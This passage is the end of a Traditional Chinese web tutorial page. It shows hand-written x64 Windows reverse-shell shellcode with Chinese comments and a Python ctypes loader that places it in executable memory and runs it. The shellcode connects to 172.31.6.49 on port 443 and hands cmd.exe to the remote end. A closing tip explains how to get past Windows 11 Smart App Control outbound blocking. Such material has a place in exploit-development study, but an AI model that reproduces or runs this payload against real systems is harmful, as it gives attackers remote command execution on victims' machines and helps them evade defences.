+    <span class="text-green-400">"   add rsp, 0x10               ;"</span>
+    <span class="text-green-400">"   mov r12, rax                ;"</span> <span class="text-slate-500"># 將 WSAStartup 的位址儲存在 R12</span>
+<span class="text-slate-500"># 呼叫 WSAStartup</span>
+    <span class="text-green-400">"   xor rcx,rcx                 ;"</span>
+    <span class="text-green-400">"   mov cx,408                  ;"</span>
+    <span class="text-green-400">"   sub rsp,rcx                 ;"</span>
+    <span class="text-green-400">"   lea rdx,[rsp]               ;"</span> <span class="text-slate-500"># lpWSAData [out]</span>
+    <span class="text-green-400">"   mov cx,514                  ;"</span> <span class="text-slate-500"># wVersionRequired</span>
+    <span class="text-green-400">"   sub rsp,88                  ;"</span>
+    <span class="text-green-400">"   call r12                    ;"</span> <span class="text-slate-500"># 呼叫 WSAStartup</span>
+<span class="text-slate-500"># 查詢 WSASocketA 位址</span>
+    <span class="text-green-400">"   mov rax, 0x4174             ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   mov rax, 0x656b636f53415357 ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   mov rdx, rsp                ;"</span> <span class="text-slate-500"># WSASocketA 存入 RDX</span>
+    <span class="text-green-400">"   mov rcx, r15                ;"</span> <span class="text-slate-500"># 將 WS2_32 基底位址複製到 RCX</span>
+    <span class="text-green-400">"   sub rsp, 0x30               ;"</span>
+    <span class="text-green-400">"   call r14                    ;"</span> <span class="text-slate-500"># 呼叫 GetProcessAddress</span>
+    <span class="text-green-400">"   add rsp, 0x30               ;"</span>
+    <span class="text-green-400">"   add rsp, 0x10               ;"</span>
+    <span class="text-green-400">"   mov r12, rax                ;"</span> <span class="text-slate-500"># 將 WSASocketA 的位址儲存在 R12</span>
+<span class="text-slate-500"># 使用 WSASocketA 建立 Socket</span>
+    <span class="text-green-400">"   sub rsp,0x208               ;"</span>
+    <span class="text-green-400">"   xor rdx, rdx                ;"</span>
+    <span class="text-green-400">"   sub rsp, 88                 ;"</span>
+    <span class="text-green-400">"   mov [rsp+32], rdx           ;"</span>
+    <span class="text-green-400">"   mov [rsp+40], rdx           ;"</span>
+    <span class="text-green-400">"   inc rdx                     ;"</span>
+    <span class="text-green-400">"   mov rcx, rdx                ;"</span>
+    <span class="text-green-400">"   inc rcx                     ;"</span>
+    <span class="text-green-400">"   xor r8,r8                   ;"</span>
+    <span class="text-green-400">"   add r8,6                    ;"</span>
+    <span class="text-green-400">"   xor r9,r9                   ;"</span>
+    <span class="text-green-400">"   mov r9w,98*4                ;"</span>
+    <span class="text-green-400">"   mov ebx,[r15+r9]            ;"</span>
+    <span class="text-green-400">"   xor r9,r9                   ;"</span>
+    <span class="text-green-400">"   call r12                    ;"</span>
+    <span class="text-green-400">"   mov r13, rax                ;"</span>
+    <span class="text-green-400">"   add rsp, 0x208              ;"</span>
+<span class="text-slate-500"># 查詢 WSAConnect 位址</span>
+    <span class="text-green-400">"   mov rax, 0x7463             ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   mov rax, 0x656e6e6f43415357 ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># WSAConnect</span>
+    <span class="text-green-400">"   mov rdx, rsp                ;"</span> <span class="text-slate-500"># WSAConnect 存入 RDX</span>
+    <span class="text-green-400">"   mov rcx, r15                ;"</span> <span class="text-slate-500"># 將 WS2_32 基底位址複製到 RCX</span>
+    <span class="text-green-400">"   sub rsp, 0x30               ;"</span>
+    <span class="text-green-400">"   call r14                    ;"</span> <span class="text-slate-500"># 呼叫 GetProcessAddress</span>
+    <span class="text-green-400">"   add rsp, 0x30               ;"</span>
+    <span class="text-green-400">"   add rsp, 0x10               ;"</span>
+    <span class="text-green-400">"   mov r12, rax                ;"</span>
+<span class="text-slate-500"># 呼叫 WSAConnect...</span>
+    <span class="text-green-400">"   mov rcx, r13                ;"</span> <span class="text-slate-500"># 我們的 Socket Handle 作為參數 1</span>
+    <span class="text-green-400">"   sub rsp,0x208               ;"</span>
+    <span class="text-green-400">"   xor rax,rax                 ;"</span>
+    <span class="text-green-400">"   inc rax                     ;"</span>
+    <span class="text-green-400">"   inc rax                     ;"</span>
+    <span class="text-green-400">"   mov [rsp], rax              ;"</span> <span class="text-slate-500"># AF_INET = 2</span>
+    <span class="text-green-400">"   mov rax, 0xbb01             ;"</span> <span class="text-slate-500"># Port 443</span>
+    <span class="text-green-400">"   mov [rsp+2], rax            ;"</span>
+    <span class="text-green-400">"   mov rax, 0x31061fac         ;"</span> <span class="text-slate-500"># IP 172.31.6.49</span>
+    <span class="text-green-400">"   mov [rsp+4], rax            ;"</span>
+    <span class="text-green-400">"   lea rdx,[rsp]               ;"</span>
+    <span class="text-green-400">"   mov r8, 0x16                ;"</span>
+    <span class="text-green-400">"   xor r9,r9                   ;"</span>
+    <span class="text-green-400">"   push r9                     ;"</span> <span class="text-slate-500"># NULL lpCallerData</span>
+    <span class="text-green-400">"   push r9                     ;"</span> <span class="text-slate-500"># NULL lpCallerData</span>
+    <span class="text-green-400">"   push r9                     ;"</span> <span class="text-slate-500"># NULL lpSQOS</span>
+    <span class="text-green-400">"   sub rsp, 0x88               ;"</span> <span class="text-slate-500"># NULL lpSQOS</span>
+    <span class="text-green-400">"   call r12                    ;"</span> <span class="text-slate-500"># 呼叫 WSAConnect</span>
+<span class="text-slate-500"># 在 kernel32.dll 中尋找 CreateProcessA 位址</span>
+<span class="text-slate-500"># 再次查詢 Kernel32 基底位址...</span>
+    <span class="text-green-400">"   xor rcx, rcx                ;"</span>
+    <span class="text-green-400">"   mov rax, gs:[rcx + 0x60]    ;"</span>
+    <span class="text-green-400">"   mov rax, [rax + 0x18]       ;"</span>
+    <span class="text-green-400">"   mov rsi, [rax + 0x20]       ;"</span>
+    <span class="text-green-400">"   lodsq                       ;"</span>
+    <span class="text-green-400">"   xchg rax, rsi               ;"</span>
+    <span class="text-green-400">"   lodsq                       ;"</span>
+    <span class="text-green-400">"   mov rbx, [rax + 0x20]       ;"</span>
+    <span class="text-green-400">"   mov r8, rbx                 ;"</span> <span class="text-slate-500"># 將 Kernel32 基底位址複製到 R8 暫存器</span>
+<span class="text-slate-500"># 尋找 CreateProcessA 的位址。存入 R12 (先前存的是 WSAConnect)</span>
+    <span class="text-green-400">"   mov rax, 0x41737365636f     ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   mov rax, 0x7250657461657243 ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># CreateProcessA</span>
+    <span class="text-green-400">"   mov rdx, rsp                ;"</span>
+    <span class="text-green-400">"   mov rcx, r8                 ;"</span> <span class="text-slate-500"># 將 Kernel32 基底位址複製到 RCX</span>
+    <span class="text-green-400">"   sub rsp, 0x30               ;"</span>
+    <span class="text-green-400">"   call r14                    ;"</span> <span class="text-slate-500"># 呼叫 GetProcessAddress</span>
+    <span class="text-green-400">"   add rsp, 0x30               ;"</span>
+    <span class="text-green-400">"   add rsp, 0x10               ;"</span>
+    <span class="text-green-400">"   mov r12, rax                ;"</span>
+<span class="text-slate-500"># 將 cmd.exe 字串推入堆疊</span>
+    <span class="text-green-400">"   mov rax, 0x6578652e646d63   ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   mov rcx, rsp                ;"</span> <span class="text-slate-500"># RCX = lpApplicationName (cmd.exe)</span>
+<span class="text-slate-500"># STARTUPINFOA 結構</span>
+    <span class="text-green-400">"   push r13                    ;"</span> <span class="text-slate-500"># Push STDERROR</span>
+    <span class="text-green-400">"   push r13                    ;"</span> <span class="text-slate-500"># Push STDOUTPUT</span>
+    <span class="text-green-400">"   push r13                    ;"</span> <span class="text-slate-500"># Push STDINPUT</span>
+    <span class="text-green-400">"   xor rax,rax                 ;"</span>
+    <span class="text-green-400">"   push ax                     ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   mov rax, 0x100              ;"</span>
+    <span class="text-green-400">"   push ax                     ;"</span>
+    <span class="text-green-400">"   xor rax,rax                 ;"</span>
+    <span class="text-green-400">"   push ax                     ;"</span>
+    <span class="text-green-400">"   push ax                     ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># dwXSize = NULL</span>
+    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># dwY = NULL</span>
+    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># dwX = NULL</span>
+    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># lpDesktop = NULL</span>
+    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># lpReserved = NULL</span>
+    <span class="text-green-400">"   mov rax, 0x68               ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># SizeOfStruct = 0x68</span>
+    <span class="text-green-400">"   mov rdi,rsp                 ;"</span> <span class="text-slate-500"># 將指標複製到 RDI</span>
+<span class="text-slate-500"># 呼叫 CreateProcessA</span>
+    <span class="text-green-400">"   mov rax, rsp                ;"</span> <span class="text-slate-500"># 取得目前堆疊指標</span>
+    <span class="text-green-400">"   sub rax, 0x500              ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># ProcessInfo</span>
+    <span class="text-green-400">"   push rdi                    ;"</span> <span class="text-slate-500"># StartupInfo = 指向 STARTUPINFOA 的指標</span>
+    <span class="text-green-400">"   xor rax, rax                ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># lpCurrentDirectory = NULL</span>
+    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># lpEnvironment = NULL</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   inc rax                     ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># bInheritHandles = 1</span>
+    <span class="text-green-400">"   xor rax, rax                ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span> <span class="text-slate-500"># dwCreationFlags = NULL</span>
+    <span class="text-green-400">"   mov r8, rax                 ;"</span> <span class="text-slate-500"># lpThreadAttributes = NULL</span>
+    <span class="text-green-400">"   mov r9, rax                 ;"</span> <span class="text-slate-500"># lpProcessAttributes = NULL</span>
+    <span class="text-green-400">"   mov rdx, rcx                ;"</span> <span class="text-slate-500"># lpCommandLine = "cmd.exe" 字串</span>
+    <span class="text-green-400">"   mov rcx, rax                ;"</span> <span class="text-slate-500"># lpApplicationName = NULL</span>
+    <span class="text-green-400">"   call r12                    ;"</span> <span class="text-slate-500"># 呼叫 CreateProcessA</span>
+)
+
+ks = Ks(KS_ARCH_X86, KS_MODE_64)
+encoding, count = ks.asm(CODE)
+<span class="text-purple-400">print</span>(<span class="text-green-400">"Encoded %d instructions..."</span> % count)
+
+sh = <span class="text-green-400">b""</span>
+<span class="text-purple-400">for</span> e <span class="text-purple-400">in</span> encoding:
+    sh += struct.pack(<span class="text-green-400">"B"</span>, e)
+shellcode = <span class="text-yellow-300">bytearray</span>(sh)
+
+ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
+ctypes.windll.kernel32.RtlCopyMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
+ctypes.windll.kernel32.CreateThread.argtypes = (
+    ctypes.c_int,
+    ctypes.c_int,
+    ctypes.c_void_p,
+    ctypes.c_int,
+    ctypes.c_int,
+    ctypes.POINTER(ctypes.c_int),
+)
+
+ptr = ctypes.windll.kernel32.VirtualAlloc(
+    ctypes.c_int(0), ctypes.c_int(<span class="text-yellow-300">len</span>(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)
+)
+
+buf = (ctypes.c_char * <span class="text-yellow-300">len</span>(shellcode)).from_buffer_copy(shellcode)
+
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, ctypes.c_int(<span class="text-yellow-300">len</span>(shellcode)))
+
+<span class="text-purple-400">print</span>(<span class="text-green-400">"Shellcode located at address %s"</span> % hex(ptr))
+<span class="text-purple-400">input</span>(<span class="text-green-400">"...ENTER TO EXECUTE SHELLCODE..."</span>)
+
+ht = ctypes.windll.kernel32.CreateThread(
+    ctypes.c_int(0),
+    ctypes.c_int(0),
+    ctypes.c_void_p(ptr),
+    ctypes.c_int(0),
+    ctypes.c_int(0),
+    ctypes.pointer(ctypes.c_int(0)),
+)
+ctypes.windll.kernel32.WaitForSingleObject(ht, -1)</pre></div></div></div><div class="bg-blue-900/20 border border-blue-500/30 p-4 rounded-b-xl flex items-start gap-3"><i class="fa-solid fa-lightbulb text-blue-400 mt-1"></i><p class="text-sm text-blue-200"><strong>TIP:</strong> Windows 11 23H2 封鎖了對本地子網（Local subnets）的 TCP 443/4444 出站連線（僅當智慧型應用程式控制 [Smart App Control] 策略設定為 封鎖 [Block] 時）。請選擇非標準連接埠或使用命名管道（Named-pipe）有效載荷。</div></div></section><footer class="text-center py-10 text-slate-500 text-sm border-t border-slate-800/50"><p class="mb-2">Generated by <a href="https://wellstsai.com"target="_blank"class="text-sky-500 hover:text-sky-400 transition-colors font-medium">wellstsai.com</a><p>撰寫日期：2025-11-25</footer></main>
